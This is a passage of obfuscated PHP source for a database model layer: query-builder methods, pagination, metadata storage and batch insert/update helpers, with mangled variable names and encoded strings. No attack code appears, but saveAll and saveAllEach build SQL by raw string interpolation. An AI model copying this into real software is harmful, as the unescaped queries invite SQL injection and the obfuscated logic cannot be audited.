$this->options[$ñ×òİ½ç[291]] = $©Û‹ ¹¦; } elseif (!empty($©Û‹ ¹¦)) { $this->options[$ñ×òİ½ç[291]][] = $©Û‹ ¹¦; } return $this; } public function union($¬ÛŠŒÇÆ, $üÃÂÎå = false) { $İ÷²†°Ñ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($¬ÛŠŒÇÆ)) { return $this; } if ($üÃÂÎå) { $this->options[$İ÷²†°Ñ[356]][$İ÷²†°Ñ[357]] = !0; } if (is_object($¬ÛŠŒÇÆ)) { $¬ÛŠŒÇÆ = get_object_vars($¬ÛŠŒÇÆ); } if (is_string($¬ÛŠŒÇÆ)) { $û÷Ï¿†ø = $¬ÛŠŒÇÆ; } elseif (is_array($¬ÛŠŒÇÆ)) { if (isset($¬ÛŠŒÇÆ[0])) { $this->options[$İ÷²†°Ñ[356]] = array_merge($this->options[$İ÷²†°Ñ[356]], $¬ÛŠŒÇÆ); return $this; } else { $û÷Ï¿†ø = $¬ÛŠŒÇÆ; } } else { think_exception(think_lang($İ÷²†°Ñ[280])); } $this->options[$İ÷²†°Ñ[356]][] = $û÷Ï¿†ø; return $this; } public function cache($ØÅŒÆ¡Ñ = true, $«­Á×Ê = null, $·‹±Óİ = '') { $ûşş»Å =& $_SERVER[ĞÆÏ¡Îª]; if (!1 !== $ØÅŒÆ¡Ñ) { $this->options[$ûşş»Å[358]] = array($ûşş»Å[94] => $ØÅŒÆ¡Ñ, $ûşş»Å[348] => $«­Á×Ê, $ûşş»Å[33] => $·‹±Óİ); } return $this; } public function field($ëñ´¡‚ˆ, $¬Óé¼»§ = false) { $Ïô³º¯Õ =& $_SERVER[ĞÆÏ¡Îª]; if (!0 === $ëñ´¡‚ˆ) { $ÎÜ÷Ãò² = $this->getDbFields(); $ëñ´¡‚ˆ = $ÎÜ÷Ãò² ? $ÎÜ÷Ãò² : $Ïô³º¯Õ[188]; } elseif ($¬Óé¼»§) { if (is_string($ëñ´¡‚ˆ)) { $ëñ´¡‚ˆ = explode($Ïô³º¯Õ[50], $ëñ´¡‚ˆ); } $ÎÜ÷Ãò² = $this->getDbFields(); $ëñ´¡‚ˆ = $ÎÜ÷Ãò² ? array_diff($ÎÜ÷Ãò², $ëñ´¡‚ˆ) : $ëñ´¡‚ˆ; } $this->options[$Ïô³º¯Õ[282]] = $ëñ´¡‚ˆ; return $this; } public function scope($ÔÌœè = '', $•›Æó˜ = NULL) { $›“¾ƒ¿æ =& $_SERVER[ĞÆÏ¡Îª]; if ($›“¾ƒ¿æ[12] === $ÔÌœè) { if (isset($this->_scope[$›“¾ƒ¿æ[37]])) { $Ø¥áé’¿ = $this->_scope[$›“¾ƒ¿æ[37]]; } else { return $this; } } elseif (is_string($ÔÌœè)) { $©ıß¶Ñ = explode($›“¾ƒ¿æ[50], $ÔÌœè); $Ø¥áé’¿ = array(); foreach ($©ıß¶Ñ as $ÖÂ«û¤Ò) { if (!isset($this->_scope[$ÖÂ«û¤Ò])) { continue; } $Ø¥áé’¿ = array_merge($Ø¥áé’¿, $this->_scope[$ÖÂ«û¤Ò]); } if (!empty($•›Æó˜) && is_array($•›Æó˜)) { $Ø¥áé’¿ = array_merge($Ø¥áé’¿, $•›Æó˜); } } elseif (is_array($ÔÌœè)) { $Ø¥áé’¿ = $ÔÌœè; } if (is_array($Ø¥áé’¿) && !empty($Ø¥áé’¿)) { $this->options = array_merge($this->options, array_change_key_case($Ø¥áé’¿)); } return $this; } public function where($·ñ÷Ç©Å, $Ÿ˜´€´ = null) { $º Öèı± =& $_SERVER[ĞÆÏ¡Îª]; if (!is_null($Ÿ˜´€´) && is_string($·ñ÷Ç©Å)) { if (!is_array($Ÿ˜´€´)) { $Ÿ˜´€´ = func_get_args(); array_shift($Ÿ˜´€´); } $Ÿ˜´€´ = array_map(array($this->db, $º Öèı±[352]), $Ÿ˜´€´); $·ñ÷Ç©Å = vsprintf($·ñ÷Ç©Å, $Ÿ˜´€´); } elseif (is_object($·ñ÷Ç©Å)) { $·ñ÷Ç©Å = get_object_vars($·ñ÷Ç©Å); } elseif (is_array($·ñ÷Ç©Å)) { foreach ($·ñ÷Ç©Å as $©Ï¾ÎèÖ => $‰à·™ƒ) { if ((is_numeric($©Ï¾ÎèÖ) || !$©Ï¾ÎèÖ) && is_string($‰à·™ƒ)) { if (strpos($‰à·™ƒ, $º Öèı±[359]) === 0) { continue; } think_trace($º Öèı±[360], $º Öèı±[12], $º Öèı±[49]); die; } } } if (is_string($·ñ÷Ç©Å) && $º Öèı±[12] != $·ñ÷Ç©Å) { $Æ‰»ĞÊÂ = array(); $Æ‰»ĞÊÂ[$º Öèı±[361]] = $·ñ÷Ç©Å; $·ñ÷Ç©Å = $Æ‰»ĞÊÂ; } if (isset($this->options[$º Öèı±[284]])) { $this->options[$º Öèı±[284]] = array_merge($this->options[$º Öèı±[284]], $·ñ÷Ç©Å); } else { $this->options[$º Öèı±[284]] = $·ñ÷Ç©Å; } return $this; } public function limit($Ğ¼ÎÇã, $ˆ×ƒÈŸà = null) { $ÜâÈœëß =& $_SERVER[ĞÆÏ¡Îª]; $this->options[$ÜâÈœëß[301]] = is_null($ˆ×ƒÈŸà) ? $Ğ¼ÎÇã : $Ğ¼ÎÇã . $ÜâÈœëß[50] . $ˆ×ƒÈŸà; return $this; } public function page($†÷íöøÅ, $‰ìÍîˆĞ = null) { $€çõËÚ =& $_SERVER[ĞÆÏ¡Îª]; $this->options[$€çõËÚ[362]] = is_null($‰ìÍîˆĞ) ? $†÷íöøÅ : $†÷íöøÅ . $€çõËÚ[50] . $‰ìÍîˆĞ; return $this; } public function comment($ ÊŞ˜Â) { $this->options[$_SERVER[ĞÆÏ¡Îª][363]] = $ ÊŞ˜Â; return $this; } public function setProperty($©‰ºşƒ, $½Ï·ŸÒ¦) { if (property_exists($this, $©‰ºşƒ)) { $this->{$©‰ºşƒ} = $½Ï·ŸÒ¦; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\145", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\x74\54\x75\x70\x64\x61\x74\x65", "\146\x75\x6e\x63\164\x69\x6f\x6e"), array("\x63\x72\145\x61\164\x65\124\x69\155\145", "\164\x69\x6d\x65", "\x69\156\x73\145\x72\164", "\146\165\156\x63\x74\x69\157\x6e")); public function setDataAuto($‹â¿¶Ğİ) { $this->dataAuto = $‹â¿¶Ğİ; } public function __construct($¶•İ‘— = '', $Ÿ€ÑÜ– = '', $ÆµâòÜò = '') { parent::__construct($¶•İ‘—, $Ÿ€ÑÜ–, $ÆµâòÜò); } protected $tableMeta = array(); protected function _beforeInsert(&$€ªÆ¦õ€, $†ÀñÙÃ) { $–Ïñ³ì» =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->checkDataAutoHas($–Ïñ³ì»[364])) { return; } $this->dataBeforeFilter($€ªÆ¦õ€, $–Ïñ³ì»[364]); } protected function _beforeUpdate(&$àüõöôï, $áûûƒ¤Ú) { $²Ï›×Óİ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->checkDataAutoHas($²Ï›×Óİ[365])) { return; } $this->dataBeforeFilter($àüõöôï, $²Ï›×Óİ[365]); } protected function _afterSelect(&$üœ¤š¼ş, $±–ãŞß ) { if (!is_array($üœ¤š¼ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[ĞÆÏ¡Îª][366])) { return; } foreach ($üœ¤š¼ş as &$ûàïëÊú) { $this->dataAfterFilter($ûàïëÊú); } unset($ûàïëÊú); } protected function _afterFind(&$òï²®úŸ, $ÇõÏ²‰È) { if (!is_array($òï²®úŸ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ĞÆÏ¡Îª][366])) { return; } $this->dataAfterFilter($òï²®úŸ); } public static function textEncode($ÌóÆ„®ğ) { if (!$ÌóÆ„®ğ) { return $ÌóÆ„®ğ; } $ÌŸÍ– = json_encode($ÌóÆ„®ğ); $ÌŸÍ– = preg_replace_callback($_SERVER[ĞÆÏ¡Îª][367], function ($Şğã©‰†) { return addslashes($Şğã©‰†[0]); }, $ÌŸÍ–); return json_decode($ÌŸÍ–); } public static function textDecode($°÷¦¤Ó) { $‰‹´…”İ =& $_SERVER[ĞÆÏ¡Îª]; $´±Œ‡ñ = json_encode($°÷¦¤Ó); $´±Œ‡ñ = preg_replace_callback($‰‹´…”İ[368], function ($“öË·À) { return $_SERVER[ĞÆÏ¡Îª][97]; }, $´±Œ‡ñ); return json_decode($´±Œ‡ñ); } public function setAutoIncrement($ÌÙœ…™) { $òİ¦±ä = array($this->getPk() => $ÌÙœ…™); $—íÎÉÂ = $this->data($òİ¦±ä)->add(); if ($—íÎÉÂ) { $this->delete($—íÎÉÂ); } } public function getAutoIncrement() { $œ¢†í…¸ = $this->getTableName(); $§İäÑû’ = $this->max($this->getPk()); $¸õ ¨À× = $this->query("\163\150\x6f\x77\x20\x74\x61\142\154\145\40\163\164\x61\164\x75\x73\40\x77\150\x65\x72\145\40\x4e\141\155\x65\75\x27{$œ¢†í…¸}\47"); $—ñÁëë‚ = $¸õ ¨À×[0][$_SERVER[ĞÆÏ¡Îª][369]]; $Ï¡Ã×ñÎ = max($§İäÑû’, $—ñÁëë‚); return $Ï¡Ã×ñÎ; } protected function _callBefore($‹±Ç‚á÷, $õı³Æñ¬) { return $this->cacheCallCheck($‹±Ç‚á÷, $õı³Æñ¬, !1); } protected function _callAfter($ëåÂú÷, $ÍÖµë¦) { return $this->cacheCallCheck($ëåÂú÷, $ÍÖµë¦, !0); } protected function cacheFunctionAlias($â½— éà) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($»ñ™§¾´, $¸Ñ¤Âññ, $ñ—ºãÃ¶ = false) { $ğÓäÓš = $this->cacheFunctionAlias($¸Ñ¤Âññ); if (!$ğÓäÓš) { return; } foreach ($ğÓäÓš as $‚û±éÍ => $Û–Ğúœò) { $¤Ã®ùí» = $Û–Ğúœò[0]; $½£„­è¯ = explode($_SERVER[ĞÆÏ¡Îª][50], $Û–Ğúœò[1]); if ($»ñ™§¾´ == $‚û±éÍ) { return $this->cacheFunctionGet($‚û±éÍ, $¤Ã®ùí»); } if ($ñ—ºãÃ¶ && in_array($»ñ™§¾´, $½£„­è¯)) { $this->cacheFunctionClear($‚û±éÍ, $¤Ã®ùí»); } } } public function cacheFunctionGet($ç÷°‚·ç, $ã²ŸˆÊ) { $©ã•ÑÒ = $this->cacheKeyMake($ç÷°‚·ç, $ã²ŸˆÊ); $ŞÉ²ó˜ú = Cache::get($©ã•ÑÒ); if (!is_array($ŞÉ²ó˜ú)) { $ŞÉ²ó˜ú = call_user_func_array(array($this, $ç÷°‚·ç), array($ã²ŸˆÊ, !0)); Cache::set($©ã•ÑÒ, $ŞÉ²ó˜ú); } return $ŞÉ²ó˜ú; } public function cacheFunctionClear($Ò¥©×Â¢, $§‚È¼¥³) { $ÒÆŞà = $§‚È¼¥³; if (!is_array($§‚È¼¥³)) { $ÒÆŞà = array($§‚È¼¥³); } foreach ($ÒÆŞà as $ÂúÑÒŞ–) { $€Áé¬îÒ = $this->cacheKeyMake($Ò¥©×Â¢, $ÂúÑÒŞ–); Cache::remove($€Áé¬îÒ); } } private function cacheKeyMake($ÊÚ¶‰„ë, $ÆÒİ£ï) { $·ÛÙÇ”Ş =& $_SERVER[ĞÆÏ¡Îª]; return get_class($this) . $·ÛÙÇ”Ş[11] . $ÊÚ¶‰„ë . $·ÛÙÇ”Ş[370] . $ÆÒİ£ï; } protected function selectPageReset() { $Ó²…´Şç =& $_SERVER[ĞÆÏ¡Îª]; if (isset($GLOBALS[$Ó²…´Şç[371]])) { return; } $GLOBALS[$Ó²…´Şç[371]] = isset($GLOBALS[$Ó²…´Şç[7]][$Ó²…´Şç[372]]) ? $GLOBALS[$Ó²…´Şç[7]][$Ó²…´Şç[372]] : !1; $GLOBALS[$Ó²…´Şç[373]] = isset($GLOBALS[$Ó²…´Şç[7]][$Ó²…´Şç[362]]) ? $GLOBALS[$Ó²…´Şç[7]][$Ó²…´Şç[362]] : !1; $GLOBALS[$Ó²…´Şç[7]][$Ó²…´Şç[372]] = !1; $GLOBALS[$Ó²…´Şç[7]][$Ó²…´Şç[362]] = !1; } protected function selectPageRestore() { $¼éÒ½ƒ• =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($GLOBALS[$¼éÒ½ƒ•[371]])) { return; } $GLOBALS[$¼éÒ½ƒ•[7]][$¼éÒ½ƒ•[372]] = $GLOBALS[$¼éÒ½ƒ•[371]]; $GLOBALS[$¼éÒ½ƒ•[7]][$¼éÒ½ƒ•[362]] = $GLOBALS[$¼éÒ½ƒ•[373]]; if ($GLOBALS[$¼éÒ½ƒ•[7]][$¼éÒ½ƒ•[372]] === !1) { unset($GLOBALS[$¼éÒ½ƒ•[7]][$¼éÒ½ƒ•[372]]); } if ($GLOBALS[$¼éÒ½ƒ•[7]][$¼éÒ½ƒ•[362]] === !1) { unset($GLOBALS[$¼éÒ½ƒ•[7]][$¼éÒ½ƒ•[362]]); } unset($GLOBALS[$¼éÒ½ƒ•[371]]); unset($GLOBALS[$¼éÒ½ƒ•[373]]); } protected function selectPage($ù•²Ö™õ = 200, $íô¿ó“… = 1) { $•˜ºø”ˆ =& $_SERVER[ĞÆÏ¡Îª]; global $in; $ğî„Î½ = $this->optionsValue(); $ï’‰¼¿¸ = 50000; $ù•²Ö™õ = isset($in[$•˜ºø”ˆ[372]]) && $in[$•˜ºø”ˆ[372]] ? $in[$•˜ºø”ˆ[372]] : $ù•²Ö™õ; if ($ù•²Ö™õ === -1) { $in[$•˜ºø”ˆ[372]] = !1; $ï’‰¼¿¸ = 100000000; $ù•²Ö™õ = $ï’‰¼¿¸; } $·©Ş€‚ = $ğî„Î½; $·©Ş€‚[$•˜ºø”ˆ[374]] = array(); $ù•²Ö™õ = intval($ù•²Ö™õ); $ù•²Ö™õ = $ù•²Ö™õ <= 5 ? 5 : ($ù•²Ö™õ >= $ï’‰¼¿¸ ? $ï’‰¼¿¸ : $ù•²Ö™õ); $íô¿ó“… = intval(isset($in[$•˜ºø”ˆ[362]]) && $in[$•˜ºø”ˆ[362]] ? $in[$•˜ºø”ˆ[362]] : $íô¿ó“…); $íô¿ó“… = $íô¿ó“… <= 1 ? 1 : $íô¿ó“…; $ÔœÌ‡çß = array(); $Ïœºá› = 1; if ($íô¿ó“… == 1 && $Ïœºá›) { $this->optionsValue($ğî„Î½); $ÔœÌ‡çß = $this->page($íô¿ó“…, $ù•²Ö™õ)->select(); $Éï—¤ = is_array($ÔœÌ‡çß) ? count($ÔœÌ‡çß) : 0; if ($Éï—¤ < $ù•²Ö™õ) { $üÛ¾„¿ô = 1; } else { $this->optionsValue($·©Ş€‚); $Éï—¤ = intval($this->count()); $üÛ¾„¿ô = ceil($Éï—¤ / $ù•²Ö™õ); } } else { $this->optionsValue($·©Ş€‚); $Éï—¤ = intval($this->count()); $üÛ¾„¿ô = ceil($Éï—¤ / $ù•²Ö™õ); $íô¿ó“… = $íô¿ó“… >= $üÛ¾„¿ô ? $üÛ¾„¿ô : $íô¿ó“…; $this->optionsValue($ğî„Î½); $ÔœÌ‡çß = $this->page($íô¿ó“…, $ù•²Ö™õ)->select(); } if (!is_array($ÔœÌ‡çß)) { $ÔœÌ‡çß = array(); } if ($üÛ¾„¿ô == 1) { $Éï—¤ = count($ÔœÌ‡çß); } $ìââ†€ò = array($•˜ºø”ˆ[375] => array($•˜ºø”ˆ[376] => $Éï—¤, $•˜ºø”ˆ[372] => $ù•²Ö™õ, $•˜ºø”ˆ[362] => $íô¿ó“…, $•˜ºø”ˆ[377] => $üÛ¾„¿ô), $•˜ºø”ˆ[378] => $ÔœÌ‡çß); return $ìââ†€ò; } protected function checkLength($‰ŠéÖÈÎ, $­¼º–×” = 0, $Ø€ëéÀ = '') { $ºÓñŠ’ =& $_SERVER[ĞÆÏ¡Îª]; $­¼º–×” = $­¼º–×” ? $­¼º–×” : 65536; if (!$‰ŠéÖÈÎ || strlen($‰ŠéÖÈÎ) < $­¼º–×”) { return; } $Ø€ëéÀ = $Ø€ëéÀ ? $Ø€ëéÀ . $ºÓñŠ’[71] : $ºÓñŠ’[12]; show_json($Ø€ëéÀ . LNG($ºÓñŠ’[379]) . "\50{$­¼º–×”}\x29", !1); } protected function metaSet($ÔÀ‹‰Ğ, $æåş¥ä² = null, $ªÏ ­ÇÙ = null) { $û‚·Ş´ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->tableMeta || !$ÔÀ‹‰Ğ) { return !1; } $·ù»ŸÄÅ = $this->tableMeta[$û‚·Ş´[380]]; $ä‹¯îÃÚ = $this->tableMeta[$û‚·Ş´[381]]; $† Şª®ë = Model($ä‹¯îÃÚ); $¾ÀÖã‹İ = array($·ù»ŸÄÅ => $ÔÀ‹‰Ğ, $û‚·Ş´[382] => $æåş¥ä²); if (is_null($æåş¥ä²)) { return $† Şª®ë->where(array($·ù»ŸÄÅ => $ÔÀ‹‰Ğ))->delete(); } if (is_null($ªÏ ­ÇÙ) && is_string($æåş¥ä²)) { return $† Şª®ë->where($¾ÀÖã‹İ)->delete(); } $‚¿û›Şİ = is_array($æåş¥ä²) ? $æåş¥ä² : array(); if (is_string($æåş¥ä²)) { $‚¿û›Şİ[$æåş¥ä²] = $ªÏ ­ÇÙ; } $Û’ğ„Úå = array(); foreach ($‚¿û›Şİ as $¡˜Æîñ => $³ÏãËì) { if (is_null($³ÏãËì) && is_string($¡˜Æîñ)) { $† Şª®ë->where(array($·ù»ŸÄÅ => $ÔÀ‹‰Ğ, $û‚·Ş´[382] => $¡˜Æîñ))->delete(); continue; } $this->checkLength($³ÏãËì, !1, $ä‹¯îÃÚ . $û‚·Ş´[4] . $¡˜Æîñ); $Û’ğ„Úå[] = array($·ù»ŸÄÅ => $ÔÀ‹‰Ğ, $û‚·Ş´[94] => $¡˜Æîñ, $û‚·Ş´[383] => $³ÏãËì); } $˜’Œ°Ã = $û‚·Ş´[384] . $ä‹¯îÃÚ; CacheLock::lock($˜’Œ°Ã); $† Şª®ë->where(array($·ù»ŸÄÅ => $ÔÀ‹‰Ğ))->addAll($Û’ğ„Úå, array(), !0); CacheLock::unlock($˜’Œ°Ã); return !0; } public function metaGet($­ÅÃõÙ…, $ı‰…§·Ç = false) { $¾ı¥íÄà =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->tableMeta) { return array(); } $ù‘‚Ô§ï = $this->tableMeta[$¾ı¥íÄà[380]]; $öÂîÀâñ = Model($this->tableMeta[$¾ı¥íÄà[381]]); if ($ı‰…§·Ç) { $ş³ÙÔ¾» = array($ù‘‚Ô§ï => $­ÅÃõÙ…, $¾ı¥íÄà[94] => $ı‰…§·Ç); return $öÂîÀâñ->where($ş³ÙÔ¾»)->getField($¾ı¥íÄà[383]); } $ş³ÙÔ¾» = array($ù‘‚Ô§ï => $­ÅÃõÙ…); $è©ş¡º´ = $öÂîÀâñ->field($¾ı¥íÄà[385])->where($ş³ÙÔ¾»)->select(); $è©ş¡º´ = array_to_keyvalue($è©ş¡º´, $¾ı¥íÄà[94], $¾ı¥íÄà[383]); return $è©ş¡º´; } private function checkDataAutoHas($ÇûîˆÛ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $­ÁÄÅÙ¦) { if (in_array($ÇûîˆÛ, explode($_SERVER[ĞÆÏ¡Îª][50], $­ÁÄÅÙ¦[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ï¾µÜ—Ò, $¶Ã÷õÚ») { $ŒŒó»°— =& $_SERVER[ĞÆÏ¡Îª]; if (!is_array($ï¾µÜ—Ò)) { return; } foreach ($this->dataAuto as $‰ĞÂìõº) { $¦³İ§û = $‰ĞÂìõº[0]; if (!in_array($¶Ã÷õÚ», explode($ŒŒó»°—[50], $‰ĞÂìõº[2]))) { continue; } switch (trim($‰ĞÂìõº[3])) { case $ŒŒó»°—[330]: case $ŒŒó»°—[331]: $éş×Éê„ = $‰ĞÂìõº[1]; $Ñ®İòÁ = isset($‰ĞÂìõº[4]) ? (array) $‰ĞÂìõº[4] : array(); if ($éş×Éê„ == $ŒŒó»°—[203] && array_key_exists($¦³İ§û, $ï¾µÜ—Ò)) { if (!$ï¾µÜ—Ò[$¦³İ§û]) { unset($ï¾µÜ—Ò[$¦³İ§û]); } break; } if (isset($ï¾µÜ—Ò[$¦³İ§û])) { array_unshift($Ñ®İòÁ, $ï¾µÜ—Ò[$¦³İ§û]); } if ($ŒŒó»°—[330] == $‰ĞÂìõº[3]) { $ï¾µÜ—Ò[$¦³İ§û] = call_user_func_array($éş×Éê„, $Ñ®İòÁ); } else { $ï¾µÜ—Ò[$¦³İ§û] = call_user_func_array(array(&$this, $éş×Éê„), $Ñ®İòÁ); } break; case $ŒŒó»°—[279]: if (isset($ï¾µÜ—Ò[$¦³İ§û]) && $ï¾µÜ—Ò[$¦³İ§û]) { $ï¾µÜ—Ò[$¦³İ§û] = call_user_func_array(array(&$this, $‰ĞÂìõº[1]), array($ï¾µÜ—Ò[$¦³İ§û])); } break; case $ŒŒó»°—[282]: $ï¾µÜ—Ò[$¦³İ§û] = $ï¾µÜ—Ò[$‰ĞÂìõº[1]]; break; case $ŒŒó»°—[303]: if (isset($ï¾µÜ—Ò[$¦³İ§û]) && !is_string($ï¾µÜ—Ò[$¦³İ§û])) { $ï¾µÜ—Ò[$¦³İ§û] = json_encode_force($ï¾µÜ—Ò[$¦³İ§û]); } break; case $ŒŒó»°—[332]: if ($ï¾µÜ—Ò[$¦³İ§û] === $ŒŒó»°—[12]) { unset($ï¾µÜ—Ò[$¦³İ§û]); } break; case $ŒŒó»°—[333]: $ï¾µÜ—Ò[$¦³İ§û] = $‰ĞÂìõº[1]; default: break; } } if ($¶Ã÷õÚ» == $ŒŒó»°—[364]) { $¹§´Šº’ = strtolower($this->db->getDbType()); if (strpos($¹§´Šº’, $ŒŒó»°—[13]) !== 0) { return; } $¹ÑÊÀ·¡ = $this->field(!0)->fields; $À³¦­«Õ = $¹ÑÊÀ·¡[$ŒŒó»°—[261]]; if (isset($¹ÑÊÀ·¡[$ŒŒó»°—[260]])) { unset($À³¦­«Õ[$¹ÑÊÀ·¡[$ŒŒó»°—[260]]]); } foreach ($À³¦­«Õ as $¯Š¾ò™¯ => $¶Ã÷õÚ») { if (!isset($ï¾µÜ—Ò[$¯Š¾ò™¯])) { $ï¾µÜ—Ò[$¯Š¾ò™¯] = $ŒŒó»°—[12]; } } } } private function dataAfterFilter(&$áı ë·ˆ) { $ƒë úŒÛ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($this->dataAuto as $ÑŸËè«Á) { $ş„øõ = $ÑŸËè«Á[0]; if (!isset($áı ë·ˆ[$ş„øõ])) { continue; } if (!in_array($ƒë úŒÛ[366], explode($ƒë úŒÛ[50], $ÑŸËè«Á[2]))) { continue; } switch (trim($ÑŸËè«Á[3])) { case $ƒë úŒÛ[330]: case $ƒë úŒÛ[331]: $î‚®ê = isset($ÑŸËè«Á[4]) ? (array) $ÑŸËè«Á[4] : array(); array_unshift($î‚®ê, $áı ë·ˆ[$ş„øõ]); if (isset($ÑŸËè«Á[4]) && $ÑŸËè«Á[4] == $ƒë úŒÛ[386]) { $î‚®ê = array($áı ë·ˆ[$ş„øõ]); } if ($ƒë úŒÛ[330] == $ÑŸËè«Á[3]) { $áı ë·ˆ[$ş„øõ] = call_user_func_array($ÑŸËè«Á[1], $î‚®ê); } else { $áı ë·ˆ[$ş„øõ] = call_user_func_array(array(&$this, $ÑŸËè«Á[1]), $î‚®ê); } break; case $ƒë úŒÛ[279]: if (isset($áı ë·ˆ[$ş„øõ]) && $áı ë·ˆ[$ş„øõ]) { $áı ë·ˆ[$ş„øõ] = call_user_func_array(array(&$this, $ÑŸËè«Á[1]), array($áı ë·ˆ[$ş„øõ])); } break; case $ƒë úŒÛ[282]: $áı ë·ˆ[$ş„øõ] = $áı ë·ˆ[$ÑŸËè«Á[1]]; break; case $ƒë úŒÛ[303]: $ƒú»› = $áı ë·ˆ[$ş„øõ]; $áı ë·ˆ[$ş„øõ] = json_decode($ƒú»›, !0); if (is_null($áı ë·ˆ[$ş„øõ])) { $áı ë·ˆ[$ş„øõ] = $ƒú»›; } break; case $ƒë úŒÛ[332]: if ($áı ë·ˆ[$ş„øõ] === $ƒë úŒÛ[12]) { unset($áı ë·ˆ[$ş„øõ]); } break; case $ƒë úŒÛ[333]: $áı ë·ˆ[$ş„øõ] = $ÑŸËè«Á[1]; break; default: break; } } } public function saveAll($ÌˆúÚà¯) { $†Êıá Œ =& $_SERVER[ĞÆÏ¡Îª]; $Ğ›ó¬ıÉ = $this->tablePrefix . $this->tableName; $›ÖÕæÌˆ = self::SQL_WHERE_IN_CHUNK; $ÌˆúÚà¯ = is_array($ÌˆúÚà¯) ? $ÌˆúÚà¯ : array(); $ÆÌ€«ßä = $†Êıá Œ[246]; $µëîàÑ = 0; $ÆšŒÌé¶ = array(); $æ²€˜³€ = count($ÌˆúÚà¯); for ($«ó˜€š = 0; $«ó˜€š < $æ²€˜³€; $«ó˜€š++) { $ú´Ë“ŒÑ = $ÌˆúÚà¯[$«ó˜€š]; if (!is_array($ú´Ë“ŒÑ) || count($ú´Ë“ŒÑ) != 4) { continue; } $œ®ÈôÆÖ = "\x55\120\104\x41\x54\x45\x20\x60{$Ğ›ó¬ıÉ}\140\x20\x53\x45\124\40{$ú´Ë“ŒÑ[2]}\40\x3d\40\103\101\123\105\x20{$ú´Ë“ŒÑ[0]}\40\xa"; if ($µëîàÑ == 0) { $ÆÌ€«ßä = $œ®ÈôÆÖ; } $ÆšŒÌé¶[] = $†Êıá Œ[118] . $ú´Ë“ŒÑ[1] . $†Êıá Œ[118]; $µëîàÑ++; $ÆÌ€«ßä .= "\40\x57\x48\105\116\x20\47{$ú´Ë“ŒÑ[1]}\x27\x20\x54\x48\105\x4e\40\47{$ú´Ë“ŒÑ[3]}\47\40\xa"; if ($µëîàÑ == $›ÖÕæÌˆ || $«ó˜€š == $æ²€˜³€ - 1) { $¶ıÚ‚‘Á = implode($†Êıá Œ[50], $ÆšŒÌé¶); $ÆÌ€«ßä .= "\x20\x45\x4e\x44\x20\x20\127\110\105\122\x45\x20{$ú´Ë“ŒÑ[0]}\40\111\x4e\x20\50{$¶ıÚ‚‘Á}\51\40"; $this->execute($ÆÌ€«ßä); $µëîàÑ = 0; $ÆÌ€«ßä = $œ®ÈôÆÖ; $this->chunkEventCheck(count($ÆšŒÌé¶)); $ÆšŒÌé¶ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ò÷ûĞû) { $¼ê¦óá =& $_SERVER[ĞÆÏ¡Îª]; $×õÆÀÍ® = $this->tablePrefix . $this->tableName; foreach ($ò÷ûĞû as $àú¦èú²) { if (!is_array($àú¦èú²) || count($àú¦èú²) != 4) { continue; } $†Õ—–Ş¬ = $àú¦èú²[0] . $¼ê¦óá[387] . $àú¦èú²[1] . $¼ê¦óá[118]; $õÁ‹ÅÃ„ = $àú¦èú²[2] . $¼ê¦óá[387] . $àú¦èú²[3] . $¼ê¦óá[118]; $•™…ËĞ– = "\x75\160\x64\141\164\145\40{$×õÆÀÍ®}\40\163\x65\x74\40{$õÁ‹ÅÃ„}\40\x77\150\145\x72\145\40{$†Õ—–Ş¬}\x3b"; $this->execute($•™…ËĞ–); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¢æ¹¿† = false, $ÅÑãÌ˜‚ = false) { $this->_chunkEvent = $¢æ¹¿†; $this->_chunkEventParam = $ÅÑãÌ˜‚; } private function chunkEventCheck($Ìßê½Ñ) { if (!$this->_chunkEvent) { return; } $ŸÊåÎı  = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ŸÊåÎı [$_SERVER[ĞÆÏ¡Îª][388]] = $Ìßê½Ñ; Hook::trigger($this->_chunkEvent, $ŸÊåÎı ); } public function addAll($™Ÿ´œ‹ú, $˜ùïÂù¶ = array(), $Ğ­²’ = false) { $—­œ™…Ÿ =& $_SERVER[ĞÆÏ¡Îª]; ignore_timeout(); $ŠÌ·ß‚ = self::SQL_WHERE_IN_CHUNK; if (empty($™Ÿ´œ‹ú)) { $this->error = think_lang($—­œ™…Ÿ[280]); return !1; } $˜ùïÂù¶ = $this->_parseOptions($˜ùïÂù¶); foreach ($™Ÿ´œ‹ú as $òœß™•Å => $æã£¼Åƒ) { $™Ÿ´œ‹ú[$òœß™•Å] = $this->_facade($æã£¼Åƒ); $this->_beforeInsert($™Ÿ´œ‹ú[$òœß™•Å], $˜ùïÂù¶); } if (method_exists($this->db, $—­œ™…Ÿ[281])) { for ($ê‘³¡óÓ = 0; $ê‘³¡óÓ < count($™Ÿ´œ‹ú); $ê‘³¡óÓ += $ŠÌ·ß‚) { $ÜïÏ‹ôÓ = array_slice($™Ÿ´œ‹ú, $ê‘³¡óÓ, $ŠÌ·ß‚); if (!is_array($ÜïÏ‹ôÓ) || count($ÜïÏ‹ôÓ) == 0) { break; } $íÁñöĞØ = $this->db->insertAll($ÜïÏ‹ôÓ, $˜ùïÂù¶, $Ğ­²’); $this->chunkEventCheck(count($ÜïÏ‹ôÓ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($™Ÿ´œ‹ú as $òœß™•Å => $æã£¼Åƒ) { $íÁñöĞØ = $this->db->insert($æã£¼Åƒ, $˜ùïÂù¶, $Ğ­²’); } $this->commit(); } if (!1 !== $íÁñöĞØ) { $†ÔÚÇÎÑ = $this->getLastInsID(); if ($†ÔÚÇÎÑ) { return $†ÔÚÇÎÑ; } } return 